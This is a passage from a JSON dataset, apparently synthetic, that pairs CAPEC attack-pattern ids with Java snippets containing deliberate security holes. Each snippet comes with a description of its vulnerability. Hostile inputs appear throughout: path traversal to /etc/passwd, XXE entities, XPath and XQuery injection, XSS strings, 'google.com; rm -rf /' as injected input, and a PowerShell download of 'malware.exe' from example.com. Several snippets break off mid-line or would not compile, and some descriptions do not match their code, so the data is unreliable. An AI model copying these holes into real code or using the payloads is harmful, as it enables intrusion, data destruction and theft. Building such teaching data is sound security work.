        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class PathTraversal {\n    public static void main(String[] args) {\n        String userInput = \"../../../../etc/passwd\";\n        String basePath = \"./uploads/\";\n        String filePath = basePath + userInput;\n        File file = new File(filePath);\n        try {\n            if (file.exists()) {\n                System.out.println(\"File exists: \" + filePath);\n            } else {\n                file.createNewFile();\n                System.out.println(\"File created: \" + filePath);\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a path traversal vulnerability. The 'userInput' variable is not properly sanitized, allowing an attacker to manipulate the file path and access sensitive areas of the file system. The code uses relative paths and does not properly neutralize special elements such as '..' that can resolve to a location outside of the intended directory."
    },
    {
        "capec_id": "77",
        "code_snippet": "public class VulnerableApp {\n    public static void main(String[] args) {\n        String debug = System.getProperty(\"debug\");\n        if (debug != null && debug.equals(\"1\")) {\n            // Granting admin access without proper authentication\n            isAdmin = true;\n        }\n        if (isAdmin) {\n            // Performing sensitive operations\n            System.out.println(\"Admin access granted\");\n            // ... \n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC, where an adversary can override variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In this example, the 'debug' system property can be controlled by an attacker, allowing them to gain admin access without proper authentication, illustrating CWE-285 (Improper Authorization) and CWE-302 (Authentication Bypass by Assumed-Immutable Data)."
    },
    {
        "capec_id": "78",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = \"../../../../etc/passwd\";\n        String canonicalPath = new File(userInput).getCanonicalPath();\n        if (isValidInput(canonicalPath)) {\n            try {\n                Files.copy(Paths.get(canonicalPath), Paths.get(\"/output/path\"), StandardCopyOption.REPLACE_EXISTING);\n            } catch (IOException e) {\n                System.out.println(\"Error: \" + e.getMessage());\n            }\n        }\n    }\n\n    private static boolean isValidInput(String input) {\n        // Incorrect validation: only checks if the input is not null\n        return input != null;\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack by using alternate encoding to bypass input validation. The code takes user input and uses it to construct a file path, which is then used to copy a file. The input is not properly validated, allowing an attacker to provide a malicious path using backslash encoding. The code also incorrectly validates the input before canonicalizing it, which can lead to filter problems. Additionally, the code does not properly handle alternate encoding, and does not neutralize special elements in the input, making it vulnerable to path traversal and injection attacks."
    },
    {
        "capec_id": "79",
        "code_snippet": "public class FileAccessor {\n    public void accessFile(String filePath) {\n        if (filePath.startsWith(\\",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting encoding of Slash characters. The code has multiple vulnerabilities, including CWE-20 (Improper Input Validation), CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-73 (External Control of File Name or Path), and CWE-707 (Improper Neutralization). The code does not properly validate the input file path, allowing an attacker to traverse the file system and access sensitive files. The use of both forward and backward slashes in the file path can lead to filtering problems, making it easier for an attacker to exploit the system."
    },
    {
        "capec_id": "80",
        "code_snippet": "public class UTF8InputValidator {\n    public boolean isValidInput(String input) {\n        // CWE-20: Improper Input Validation\n        // CWE-173: Improper Handling of Alternate Encoding\n        // CWE-172: Encoding Error\n        try {\n            byte[] bytes = input.getBytes(\"UTF-8\");\n            String canonicalizedInput = new String(bytes, \"UTF-8\");\n            // CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n            // CWE-181: Incorrect Behavior Order: Validate Before Filter\n            if (canonicalizedInput.matches(\"[<>]\")) {\n                return false;\n            }\n            // CWE-73: External Control of File Name or Path\n            // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n            File file = new File(canonicalizedInput);\n            if (!file.exists()) {\n                return false;\n            }\n            // CWE-697: Incorrect Comparison\n            // CWE-692: Incomplete Denylist to Cross-Site Scripting\n            if (canonicalizedInput.compareTo(\"<script>\") == 0) {\n                return false;\n            }\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable input validation mechanism that is susceptible to UTF-8 encoding attacks. It fails to properly handle alternate encodings, encoding errors, and incorrect behavior orders, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "81",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class WebLogTampering {\n    public static void main(String[] args) {\n        String logMessage = \"<script>alert('XSS')</script>\";\n        try (FileWriter fw = new FileWriter(\"web.log\", true);\n             PrintWriter pw = new PrintWriter(fw)) {\n            pw.println(logMessage);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Web Log Tampering attack by writing a malicious log message to a web log file. The log message contains a script tag that could potentially lead to a cross-site scripting (XSS) attack. The code does not properly sanitize the input log message, allowing an attacker to inject malicious data into the log file. This vulnerability is related to CWE-117: Improper Output Neutralization for Logs, CWE-93: Improper Neutralization of CRLF Sequences, CWE-75: Failure to Sanitize Special Elements into a Different Plane, and CWE-20: Improper Input Validation."
    },
    {
        "capec_id": "82",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.NodeList;\nimport org.w3c.dom.Node;\nimport org.w3c.dom.Element;\n\npublic class VulnerableXMLParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(new java.io.ByteArrayInputStream(xml.getBytes()));\n            NodeList nList = doc.getElementsByTagName(\"*\");\n            for (int temp = 0; temp < nList.getLength(); temp++) {\n                Node nNode = nList.item(temp);\n                if (nNode instanceof Element) {\n                    Element eElement = (Element) nNode;\n                    System.out.println(eElement.getNodeName() + \": \" + eElement.getTextContent());\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) {\n        String maliciousXML = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\";\n        parseXML(maliciousXML);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML injection and XML external entity attacks due to missing XML validation, improper restriction of XML external entity references, and improper restriction of recursive entity references in DTDs. The code does not properly neutralize special elements in the XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed. The main method parses a malicious XML string that contains an external entity reference to the /etc/passwd file, demonstrating the vulnerability."
    },
    {
        "capec_id": "83",
        "code_snippet": "import javax.xml.xpath.XPath; import javax.xml.xpath.XPathConstants; import javax.xml.xpath.XPathExpression; import javax.xml.xpath.XPathFactory; import org.w3c.dom.Document; import org.w3c.dom.NodeList; import org.xml.sax.InputSource; public class XPathInjection { public static void main(String[] args) throws Exception { String userInput = \"//password[.='\" + args[0] + \"']\"; Document doc = loadXMLDocument(); XPath xpath = XPathFactory.newInstance().newXPath(); XPathExpression expr = xpath.compile(userInput); NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET); if (nodes.getLength() > 0) { System.out.println(\"User found!\"); } else { System.out.println(\"User not found.\"); } } private static Document loadXMLDocument() throws Exception { // Load XML document from file or database return null; } }",
        "description": "This Java code snippet demonstrates XPath Injection vulnerability. It takes user input and uses it to construct an XPath expression to query an XML database. The input is not properly sanitized, allowing an attacker to inject malicious XPath expressions to bypass authentication or retrieve sensitive information. The code is vulnerable to CWE-91 (XML Injection), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-707 (Improper Neutralization), and CWE-643 (Improper Neutralization of Data within XPath Expressions)."
    },
    {
        "capec_id": "84",
        "code_snippet": "import javax.xml.xquery.XQConnection;\nimport javax.xml.xquery.XQException;\nimport javax.xml.xquery.XQExpression;\nimport javax.xml.xquery.XQResultSequence;\n\npublic class XQueryInjection {\n    public static void main(String[] args) {\n        String userInput = \"' or 1=1 or '\"; // attacker-controlled input\n        String xquery = \"for $i in collection('my-collection') where $i/name = '\" + userInput + \"' return $i\";\n        try (XQConnection conn = new XQConnection()) {\n            XQExpression expr = conn.createExpression();\n            XQResultSequence result = expr.executeQuery(xquery);\n            while (result.next()) {\n                System.out.println(result.getItemAsString(null));\n            }\n        } catch (XQException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates XQuery Injection (CWE-652) by constructing an XQuery expression using unvalidated user input. The input is concatenated into the XQuery string without proper sanitization, allowing an attacker to inject malicious XQuery commands. This can lead to unauthorized data access, modification, or execution of system commands. The code is vulnerable to CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component) and CWE-707 (Improper Neutralization)."
    },
    {
        "capec_id": "85",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class AjaxFingerprintingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        String response = \"\";\n\n        // CWE-20: Improper Input Validation\n        if (userInput != null) {\n            response += \"<script>alert('\" + userInput + \"');</script>\";\n        }\n\n        // CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n        resp.getWriter().write(response);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack by using Ajax fingerprinting to scan a system. The servlet takes user input and reflects it back in the response without proper validation or neutralization, making it vulnerable to cross-site scripting (XSS) attacks. The code also lacks proper encoding or escaping of output, making it vulnerable to HTTP request/response splitting and other attacks."
    },
    {
        "capec_id": "86",
        "code_snippet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getHeader(\"Referer\");\n        String htmlResponse = \"<img src='\" + userInput + \"' alt='user input image'>\";\n        response.setContentType(\"text/html\");\n        response.getWriter().write(htmlResponse);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to XSS attacks through HTTP headers. The servlet retrieves the 'Referer' header from the HTTP request and injects it into an HTML response without proper validation or sanitization, allowing an attacker to inject malicious script tags or attributes."
    },
    {
        "capec_id": "87",
        "code_snippet": "public class ForcefulBrowsingExample {\n    public static void main(String[] args) {\n        // CWE-425: Direct Request ('Forced Browsing')\n        String adminPage = \"http://example.com/admin/deleteUser?username=admin\";\n        try {\n            URL url = new URL(adminPage);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\"); // CWE-598: Use of GET Request Method With Sensitive Query Strings\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Access granted!\");\n            } else {\n                System.out.println(\"Access denied!\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates forceful browsing (direct URL entry) to access a restricted admin page without proper authorization. The code uses the HTTP GET method with sensitive query strings, which is vulnerable to CWE-598. The lack of proper authorization checks allows an attacker to access the admin page, illustrating CWE-425 and CWE-285. The code also fails to use a protection mechanism to defend against directed attacks, as described in CWE-693. Additionally, the code does not handle context switching race conditions, as described in CWE-368."
    },
    {
        "capec_id": "88",
        "code_snippet": "public class VulnerableOSCommandInjection {\n    public void executeCommand(String userInput) {\n        String command = \"ping -c 1 \" + userInput;\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        VulnerableOSCommandInjection vulnerableOSCommandInjection = new VulnerableOSCommandInjection();\n        vulnerableOSCommandInjection.executeCommand(\"google.com; rm -rf /\");\n    }\n}",
        "description": "This Java code snippet demonstrates OS command injection vulnerability. The `executeCommand` method constructs an OS command using untrusted user input, which can lead to arbitrary command execution. In the `main` method, the `executeCommand` method is called with a malicious input that injects an additional OS command to delete the root directory."
    },
    {
        "capec_id": "89",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class PharmingAttack {\n    public static void main(String[] args) throws Exception {\n        String url = \"http://example.com\"; // Attacker's phishing site\n        URL obj = new URL(url);\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n        con.setRequestMethod(\"GET\");\n        int responseCode = con.getResponseCode();\n        if (responseCode == 200) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            // Process the response without validating the origin\n            System.out.println(response.toString());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a pharming attack by making an HTTP request to a phishing site without properly verifying the origin of the response. The code uses the HttpURLConnection class to send a GET request to the attacker's site and processes the response without checking its integrity or origin, making it vulnerable to CWE-346, CWE-350, CWE-602, CWE-79, and CWE-494."
    },
    {
        "capec_id": "90",
        "code_snippet": "public class AuthenticationProtocol {\n    private String username;\n    private String password;\n\n    public AuthenticationProtocol(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public boolean authenticate(String challenge) {\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // CWE-303: Incorrect Implementation of Authentication Algorithm\n        // CWE-294: Authentication Bypass by Capture-replay\n        // CWE-305: Authentication Bypass by Primary Weakness\n        // CWE-290: Authentication Bypass by Spoofing\n        String response = username + \":\" + password;\n        return response.equals(challenge);\n    }\n\n    public static void main(String[] args) {\n        AuthenticationProtocol ap = new AuthenticationProtocol(\"user\", \"pass\");\n        String challenge = \"user:pass\";\n        if (ap.authenticate(challenge)) {\n            System.out.println(\"Authentication successful\");\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication protocol susceptible to reflection attacks. The authenticate method takes a challenge as input and checks if it matches the concatenated username and password. This implementation is incorrect and can be bypassed by an adversary using a reflection attack, capture-replay, or spoofing. The main method shows how an attacker can impersonate a legitimate user and gain illegitimate access to the system."
    },
    {
        "capec_id": "91",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String userInput = req.getParameter(\"input\");\n        String html = \"<img src='\" + userInput + \"' alt='' />\");\n        res.setContentType(\"text/html\");\n        PrintWriter out = res.getWriter();\n        out.println(html);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to XSS attacks. It takes user input from a GET request parameter and injects it directly into the src attribute of an IMG tag without proper sanitization or encoding, allowing an attacker to inject malicious script code."
    },
    {
        "capec_id": "92",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        int size = 2147483647; // maximum possible value for an integer in Java\n        int userInput = 2;\n        size += userInput;\n        byte[] buffer = new byte[size]; // potential integer overflow or wraparound\n        byte[] userInputBuffer = new byte[userInput];\n        System.arraycopy(userInputBuffer, 0, buffer, 0, userInput); // potential buffer overflow\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of forcing an integer variable to go out of range, which can lead to unexpected behavior or arbitrary code execution. The code is vulnerable to CWE-190 (Integer Overflow or Wraparound), CWE-128 (Wrap-around Error), CWE-120 (Buffer Copy without Checking Size of Input), CWE-122 (Heap-based Buffer Overflow), CWE-196 (Unsigned to Signed Conversion Error), CWE-680 (Integer Overflow to Buffer Overflow), and CWE-697 (Incorrect Comparison). The 'size' variable is incremented past its maximum possible value, which can cause it to wrap around to a very small or negative number, leading to a potential buffer overflow when allocating memory for the 'buffer' array."
    },
    {
        "capec_id": "93",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.Scanner;\n\npublic class LogManipulation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter log entry:\");\n        String logEntry = scanner.nextLine();\n\n        try (PrintWriter writer = new PrintWriter(new FileWriter(\"log_file.log\", true))) {\n            writer.println(logEntry);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of log file manipulation by allowing an attacker to inject malicious log entries. The code does not properly sanitize user input, making it vulnerable to CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection) and CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences. Additionally, the code logs user-provided input without proper neutralization, making it vulnerable to CWE-117: Improper Output Neutralization for Logs and CWE-532: Insertion of Sensitive Information into Log File. The code also logs excessive data, making it vulnerable to CWE-779: Logging of Excessive Data."
    },
    {
        "capec_id": "94",
        "code_snippet": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\n\npublic class ManInTheMiddle {\n    public static void main(String[] args) throws IOException, NoSuchAlgorithmException, KeyManagementException {\n        SSLContext ctx = SSLContext.getInstance(\\",
        "description": "This Java code snippet demonstrates a man-in-the-middle attack, where an adversary intercepts and alters the communication between a client and a server. The code establishes an SSL connection to a server, sends a request, and receives a response. It then modifies the SSL context and replays the request, bypassing authentication. This code embodies the CAPEC and CWEs mentioned, including channel accessibility by non-endpoints, authentication bypass by spoofing, improper authentication, and capture-replay attacks."
    },
    {
        "capec_id": "95",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport javax.xml.ws.Endpoint;\n\npublic class VulnerableWebService {\n    public static void main(String[] args) {\n        try {\n            Endpoint.publish(\"http://localhost:8080/webservice\", new MyWebService());\n            File wsdlFile = new File(\"webservice.wsdl\");\n            FileWriter writer = new FileWriter(wsdlFile);\n            writer.write(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                    \"<definitions xmlns=\\\"http://schemas.xmlsoap.org/wsdl/\\\"\\n\" +\n                    \"    xmlns:soap=\\\"http://schemas.xmlsoap.org/wsdl/soap/\\\"\\n\" +\n                    \"    xmlns:tns=\\\"http://example.com/webservice\\\"\\n\" +\n                    \"    targetNamespace=\\\"http://example.com/webservice\\\">\\n\" +\n                    \"    <service name=\\\"MyWebService\\\">\\n\" +\n                    \"        <port name=\\\"MyWebServicePort\\\" binding=\\\"tns:MyWebServiceBinding\\\">\\n\" +\n                    \"            <soap:address location=\\\"http://localhost:8080/webservice\\\"/>\\n\" +\n                    \"        </port>\\n\" +\n                    \"    </service>\\n\" +\n                    \"</definitions>\");\n            writer.close();\n            System.out.println(\"WSDL file generated at \" + wsdlFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet creates a vulnerable web service that exposes sensitive information through its WSDL file. The WSDL file is generated and stored in a publicly accessible location, allowing attackers to access sensitive information about the service's ports, bindings, and underlying technology implementations. This can lead to further attacks such as parameter tampering, malicious content injection, and command injection."
    },
    {
        "capec_id": "96",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.reflect.Method;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-589: Call to Non-ubiquitous API\n            Method method = Class.forName(\\",
        "description": "This Java code snippet demonstrates the CAPEC of an application not handling blocked access to external libraries properly, leading to potential security vulnerabilities. The code includes CWE-589 by calling a non-ubiquitous API, CWE-1177 by using a prohibited library, CWE-119 by performing operations outside the bounds of a memory buffer, CWE-1322 by using blocking code in a single-threaded context, and CWE-829 by importing functionality from an untrusted source."
    },
    {
        "capec_id": "97",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class CryptanalysisExample {\n    public static void main(String[] args) throws Exception {\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\"); // DES is a broken algorithm\n        SecretKey key = keyGen.generateKey();\n\n        // CWE-1204: Generation of Weak Initialization Vector (IV)\n        byte[] iv = new byte[8]; // IV should be unpredictable and unique\n        SecureRandom random = new SecureRandom();\n        random.nextBytes(iv);\n\n        // CWE-1240: Use of a Cryptographic Primitive with a Risky Implementation\n        Cipher cipher = Cipher.getInstance(\"DES/CBC/NoPadding\", \"SunJCE\");\n        cipher.init(Cipher.ENCRYPT_MODE, key, new javax.crypto.spec.IvParameterSpec(iv));\n\n        // CWE-1241: Use of Predictable Algorithm in Random Number Generator\n        SecureRandom insecureRandom = new SecureRandom(\"insecure seed\");\n        byte[] plaintext = new byte[16];\n        insecureRandom.nextBytes(plaintext);\n\n        // CWE-1279: Cryptographic Operations are run Before Supporting Units are Ready\n        byte[] ciphertext = cipher.doFinal(plaintext);\n        System.out.println(\"Ciphertext: \" + Base64.getEncoder().encodeToString(ciphertext));\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of Cryptanalysis by using a broken cryptographic algorithm (DES), generating a weak initialization vector, using a risky implementation of a cryptographic primitive, using a predictable algorithm in a random number generator, and performing cryptographic operations before supporting units are ready. This code is vulnerable to various types of attacks, including total break, global deduction, information deduction, and distinguishing algorithm."
    },
    {
        "capec_id": "98",
        "code_snippet": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class PhishingAttack {\n    public static void redirectUser(HttpServletResponse response, String userInput) throws IOException {\n        try {\n            URI redirectUri = new URI(userInput);\n            response.sendRedirect(response.encodeRedirectURL(redirectUri.toString()));\n        } catch (URISyntaxException e) {\n            // Handle invalid URI\n        }\n    }\n\n    public static void collectUserInfo(String userInput) {\n        // Collect user information without explicit approval\n        String userInfo = getUserInfoFromUntrustedSource(userInput);\n        sendUserInfoToAttacker(userInfo);\n    }\n\n    public static void sendMaliciousCode(String userInput) {\n        // Embed malicious code in the response\n        String maliciousCode = getMaliciousCodeFromUntrustedSource(userInput);\n        sendResponseWithMaliciousCode(maliciousCode);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a phishing attack by allowing user-controlled input to redirect to an untrusted site (CWE-601), collecting user information without explicit approval (CWE-512), and embedding malicious code in the response (CWE-506). The code also misrepresents critical information to the user, making it vulnerable to phishing attacks (CWE-451)."
    },
    {
        "capec_id": "99",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.NodeList;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new java.io.StringReader(xml)));\n            NodeList nodeList = document.getElementsByTagName(\"*\");\n            for (int i = 0; i < nodeList.getLength(); i++) {\n                System.out.println(nodeList.item(i).getNodeName());\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error parsing XML: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        String maliciousXml = \"<?xml version=\\\"1.0\\\"?><!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">><root>&xxe;</root>\";\n        parseXML(maliciousXml);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML injection, missing XML validation, and improper restriction of XML external entity reference. The code does not properly neutralize special elements in the XML, allowing attackers to modify the syntax, content, or commands of the XML. It also accepts XML from an untrusted source without validating it against a proper schema. Furthermore, it processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."
    },
    {
        "capec_id": "100",
        "code_snippet": "public class VulnerableBufferOverflow {\n    public static void main(String[] args) {\n        byte[] inputBuffer = new byte[1024];\n        byte[] outputBuffer = new byte[512];\n\n        // CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n        System.arraycopy(inputBuffer, 0, outputBuffer, 0, inputBuffer.length);\n\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        outputBuffer[outputBuffer.length] = 0x01;\n\n        // CWE-131: Incorrect Calculation of Buffer Size\n        int bufferSize = Integer.MAX_VALUE - 1;\n        byte[] buffer = new byte[bufferSize];\n        buffer[bufferSize] = 0x02;\n\n        // CWE-129: Improper Validation of Array Index\n        int index = Integer.parseInt(args[0]);\n        int[] array = new int[10];\n        array[index] = 0x03;\n\n        // CWE-805: Buffer Access with Incorrect Length Value\n        byte[] buffer2 = new byte[10];\n        for (int i = 0; i <= buffer2.length; i++) {\n            buffer2[i] = 0x04;\n        }\n\n        // CWE-680: Integer Overflow to Buffer Overflow\n        int length = Integer.MAX_VALUE;\n        byte[] buffer3 = new byte[length];\n        buffer3[length - 1] = 0x05;\n    }\n}",
        "description": "This Java code snippet demonstrates various buffer overflow vulnerabilities, including CWE-120, CWE-119, CWE-131, CWE-129, CWE-805, and CWE-680. It showcases improper bounds checking, incorrect buffer size calculations, and unvalidated user input, leading to potential buffer overflows and crashes."
    },
    {
        "capec_id": "101",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class SSIInjectionVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        String filePath = \"./includes/\" + userInput + \".inc\";\n        File file = new File(filePath);\n        if (file.exists()) {\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            out.println(\"<!--#include virtual=\\\"\" + filePath + \"\\\"-->\";\n        } else {\n            response.sendError(404);\n        }\n    }\n}",
        "description": "This Java servlet is vulnerable to SSI injection. It takes user input and uses it to construct a file path for a server-side include (SSI) directive. If the file exists, it includes the contents of the file in the response. An attacker can manipulate the user input to inject malicious SSI directives, potentially leading to arbitrary code execution and information disclosure."
    },
    {
        "capec_id": "102",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SessionSidejacking {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\\",
        "description": "This Java code snippet demonstrates a session sidejacking attack, which exploits an unencrypted communication channel to capture a session token and impersonate the victim. The code sends a POST request with plaintext credentials, which can be sniffed by an attacker. The response is then parsed to extract the session token, which is used to make a subsequent request to a protected area, effectively bypassing authentication. This code embodies CWE-294 (Authentication Bypass by Capture-replay), CWE-522 (Insufficiently Protected Credentials), CWE-523 (Unprotected Transport of Credentials), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute)."
    },
    {
        "capec_id": "103",
        "code_snippet": "public class MaliciousFrame extends JFrame {\n    public MaliciousFrame() {\n        super(\"Malicious Frame\");\n        setBounds(100, 100, 300, 200);\n        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        add(new MaliciousPanel());\n    }\n\n    public static void main(String[] args) {\n        EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                try {\n                    MaliciousFrame frame = new MaliciousFrame();\n                    frame.setVisible(true);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n    }\n}\n\nclass MaliciousPanel extends JPanel {\n    public MaliciousPanel() {\n        setLayout(new BorderLayout());\n        add(new JButton(\"Click me\"), BorderLayout.CENTER);\n        JButton button = new JButton(\"Click me\");\n        button.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n                try {\n                    // CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n                    JFrame fakeFrame = new JFrame(\"Fake Frame\");\n                    fakeFrame.setBounds(200, 200, 300, 200);\n                    fakeFrame.setVisible(true);\n                    // CWE-368: Context Switching Race Condition\n                    Thread thread = new Thread(new Runnable() {\n                        public void run() {\n                            try {\n                                Thread.sleep(1000);\n                            } catch (InterruptedException ex) {\n                                Thread.currentThread().interrupt();\n                            }\n                            // CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n                            button.doClick();\n                        }\n                    });\n                    thread.start();\n                    // CWE-506: Embedded Malicious Code\n                    Runtime.getRuntime().exec(\"powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://example.com/malware.exe', 'C:\\malware.exe')\");\n                } catch (Exception ex) {\n                    ex.printStackTrace();\n                }\n            }\n        });\n        add(button, BorderLayout.SOUTH);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of tricking a victim into unknowingly initiating an action in one system while interacting with the UI from a seemingly completely different system. It uses multiple CWEs to achieve this: CWE-1021 by creating a fake frame that appears to be part of the original application, CWE-368 by using a race condition to switch contexts, CWE-1265 by unintentionally re-entering non-reentrant code, CWE-506 by embedding malicious code, and CWE-115 by misinterpreting user input."
    },
    {
        "capec_id": "104",
